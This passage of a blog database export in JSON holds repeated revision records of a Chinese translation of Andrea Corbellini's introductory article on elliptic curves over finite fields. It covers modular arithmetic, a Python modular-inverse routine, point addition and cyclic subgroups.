而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    \\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277479477,"created_at":"2019-12-25 12:37:59"},{"id":"5e0358302ee0ee0001819d39","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277488474,"created_at":"2019-12-25 12:38:08"},{"id":"5e03583f2ee0ee0001819d3b","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 